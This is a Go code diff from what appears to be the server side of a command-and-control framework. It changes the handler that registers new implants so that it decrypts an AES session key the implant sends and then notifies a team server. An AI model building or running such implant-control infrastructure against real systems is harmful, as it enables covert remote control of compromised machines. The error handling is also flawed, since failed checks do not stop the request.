@@ -13,14 +13,13 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"errors"
+	"fmt"
 	"github.com/gin-gonic/gin"
 	"io"
 	"log"
 	"net/http"
 	"os"
 	"strconv"
-	"strings"
-	"time"
 )
 
 var (
@@ -36,19 +35,23 @@ func ProcessRequest(c *gin.Context) {
 		panic(err)
 	}
 	defer c.Request.Body.Close()
-	parts := strings.Split(string(body), "=")
-	id := parts[1]
 
-	new_agent := implant.Agent{Id: id}
-	agent_arr = append(agent_arr, new_agent)
+	var data_package Common.Package
+	err = data_package.UnmarshalBinary(body)
+	if err != nil {
+		log.Println("[Error] attempting to read data from http request", err)
+		c.JSON(http.StatusInternalServerError, "Internal Server Error")
+	}
 
-	newExecPath := "/" + id + "/ExecCmd"
-	newRecvPath := "/" + id + "/RecvCmd"
-	//router.HandleFunc(newExecPath, SendCommandSingle)
-	//router.HandleFunc(newRecvPath, RecvCmdSingle)
-	log.Printf("[+] Registered New Agent at [%s], Cmd Exec Path: %s\n", time.DateTime, newExecPath)
-	log.Printf("[+] Registered New Agent at [%s], Recv Cmd Exec Path: %s\n", time.DateTime, newRecvPath)
+	for _, byte := range data_package.EncryptedAESKey {
+		fmt.Printf("0x%02X ", byte)
+	}
+	log.Println("Size of the Encrypted AESKey: ", data_package.EncryptedAESKeySize)
 
+	err = Crypt.DecryptAESKey(data_package.EncryptedAESKey, data_package.EncryptedAESKeySize, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\Config\\")
+	if err != nil {
+		c.JSON(http.StatusMovedPermanently, DenyRequest)
+	}
 	//TODO: retrieve the implant data from implant itself, process it & send event to team server.
 
 	err = SendEvent("NewImplant")
